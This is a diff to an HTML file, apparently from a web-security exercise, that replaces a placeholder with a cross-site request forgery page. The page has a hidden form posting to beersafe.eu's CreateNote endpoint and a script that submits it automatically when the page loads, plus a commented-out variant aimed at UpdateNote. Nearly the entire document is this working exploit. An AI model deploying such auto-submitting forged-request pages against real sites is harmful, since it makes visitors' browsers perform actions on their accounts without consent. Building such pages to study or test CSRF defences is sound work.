@@ -1,5 +1,21 @@
 <html>
 	<body>
-		Put CSRF code here (in the csrf.html file)
+		<form id="csrf" method="POST" action="http://beersafe.eu/CreateNote">
+			<input type="hidden" name="title" value="CSRF" />
+			<input type="hidden" name="content" value="CSRF" />
+			<input type="hidden" name="publicNote" value="1" />
+			<input type="hidden" name="beerid" value="1" />
+		</form>
+<!-- 		<form id="csrf" method="POST" action="http://beersafe.eu/UpdateNote">
+			<input type="hidden" name="title" value="CSRF update" />
+			<input type="hidden" name="content" value="CSRF update" />
+			<input type="hidden" name="publicNote" value="1" />
+			<input type="hidden" name="id" value="1" />
+		</form> -->
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+				document.getElementById("csrf").submit();
+			});
+		</script>
 	</body>
 </html>
